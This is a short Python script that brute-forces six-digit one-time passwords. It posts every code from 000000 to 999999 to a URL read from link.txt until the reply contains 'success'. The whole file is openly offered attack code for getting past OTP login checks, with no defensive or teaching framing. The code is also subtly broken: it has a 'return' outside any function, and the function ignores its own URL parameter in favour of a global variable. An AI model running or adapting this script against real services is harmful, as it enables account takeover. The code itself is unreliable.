import requests
import time

def brute_force_attack(url):
    
    for otp in range(1000000):
        otp_str = f"{otp:06d}"
        print(f"Trying OTP: {otp_str}")
        
        try:
            data = {'otp': otp_str}
            response = requests.post(target_url, data=data, timeout=5)
            
            if "success" in response.text.lower():
                success_msg = f"SUCCESS! Found valid OTP: {otp_str}"
                print(success_msg)
                print(f"Response from server: {response.text}")
                return True
            
            # Small delay to avoid overwhelming the server
            time.sleep(0.01)
            
        except requests.exceptions.RequestException as e:
            print(f"Request failed for OTP {otp_str}: {str(e)}")
            time.sleep(1)  # Longer delay if there's an error
    
    print("Brute force completed. No valid OTP found in the range 000000-999999.")
    return False




if __name__ == "__main__":

    try:
        with open('link.txt', 'r') as f:
            target_url = f.read().strip()
    except FileNotFoundError:
        print("ERROR: link.txt not found in repository root")
        return False
    
    print(f"Starting brute force attack on: {target_url}")
    print("Searching for valid OTP between 000000 and 999999...")
    
    brute_force_attack(target_url)
